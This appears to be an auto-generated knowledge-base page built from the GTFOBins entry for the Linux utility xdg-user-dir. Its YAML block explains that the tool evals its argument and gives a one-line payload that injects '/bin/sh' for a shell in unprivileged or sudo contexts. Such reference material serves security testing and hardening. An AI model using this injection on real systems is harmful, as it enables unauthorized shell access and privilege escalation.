---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# xdg-user-dir

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `xdg-user-dir` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/xdg-user-dir` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [xdg-user-dir](../../tools/linux/xdg-user-dir.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | xdg-user-dir |
| name | xdg-user-dir |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/xdg-user-dir/ |

## Preserved Source Material

```yaml
_body: ''
_name: xdg-user-dir
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/xdg-user-dir
comment: The current implementation of `xdg-user-dir` is basically `eval echo \${XDG_${1}_DIR:-$HOME}`, thus is can be easily
  used to achieve command execution.
functions:
  shell:
  - code: 'xdg-user-dir ''}; /bin/sh #'''
    contexts:
      sudo: null
      unprivileged: null
    version: < 0.20
```
